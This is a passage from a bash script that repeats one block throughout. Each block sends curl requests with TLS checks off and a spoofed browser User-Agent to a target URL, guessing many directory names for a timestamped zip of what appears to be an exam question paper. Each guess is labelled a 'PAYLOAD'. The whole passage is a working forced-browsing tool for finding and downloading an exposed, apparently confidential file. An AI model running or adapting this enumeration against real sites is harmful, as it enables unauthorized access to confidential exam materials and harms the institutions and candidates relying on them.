${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
